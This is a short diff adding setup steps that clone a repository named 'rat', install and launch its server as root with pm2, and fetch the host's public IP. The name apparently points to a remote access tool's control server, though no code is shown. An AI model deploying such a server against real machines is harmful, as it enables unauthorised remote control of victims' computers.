@@ -1,1 +1,11 @@
+1. git clone https://github.com/Dev-MHM/rat.git
 
+2. cd rat/server 
+
+3. npm install
+
+4. sudo npm install pm2 -g
+
+5. sudo pm2 start index.js
+
+6. curl ifconfig.me
